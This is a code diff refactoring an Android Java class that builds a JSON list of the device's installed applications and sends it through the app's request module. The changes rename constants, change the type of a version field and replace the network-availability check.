@@ -20,9 +20,12 @@ import android.graphics.drawable.Drawable;
 import android.preference.PreferenceManager;
 import android.util.Base64;
 
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.bs.NetworkChangeReceiver;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
+import com.inet.android.utils.ValueWork;
+
 /**
  * ListApp class is designed to get the list of applications
  * 
@@ -35,8 +38,8 @@ public class ListApp {
 	private String complete;
 	private static String LOG_TAG = ListApp.class.getSimpleName().toString();
 	private final int COMPRESSION_QUALITY = 100;
-	private String version;
-		
+	private int version;
+
 	/**
 	 * get the list of all installed applications in the device
 	 * 
@@ -45,15 +48,14 @@ public class ListApp {
 	@SuppressLint("NewApi")
 	public void getListOfInstalledApp(Context context) {
 		this.mContext = context;
-		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
-		version = sp.getString("list_app", "0");
+		version = ValueWork.getMethod(ConstantValue.TYPE_LIST_APP, mContext);
 		String sendStr = null;
-		
+
 		Logging.doLog(LOG_TAG, "getListOfInstalledApp", "getListOfInstalledApp");
 
 		// -------initial json line----------------------
 		JSONObject jsonAppList = new JSONObject();
-		if (sp.getBoolean("network_available", true) == true) {
+		if (NetworkChangeReceiver.isOnline(context)) {
 			int flags = PackageManager.GET_META_DATA
 					| PackageManager.GET_SHARED_LIBRARY_FILES
 					| PackageManager.GET_UNINSTALLED_PACKAGES;
@@ -98,7 +100,7 @@ public class ListApp {
 						jsonAppList.put("dir", app.sourceDir);
 						jsonAppList.put("time", installTime);
 						jsonAppList.put("build", packageInfo.versionCode);
-						
+
 						if (sendStr == null)
 							sendStr = jsonAppList.toString();
 						else
@@ -129,7 +131,8 @@ public class ListApp {
 				sendStr = null;
 			}
 		} else {
-			TurnSendList.setList(ConstantRequest.TYPE_LIST_APP_REQUEST, version, "0",mContext);
+			TurnSendList.setList(ConstantValue.TYPE_LIST_APP, version, "0",
+					mContext);
 		}
 	}
 
@@ -140,6 +143,7 @@ public class ListApp {
 	}
 
 	private void sendRequest(String str, String complete) {
-			RequestList.sendDemandRequest(str, ConstantRequest.TYPE_LIST_APP_REQUEST, complete, version, mContext);
+		RequestList.sendDemandRequest(str, ConstantValue.TYPE_LIST_APP_REQUEST,
+				complete, version, mContext);
 	}
 }
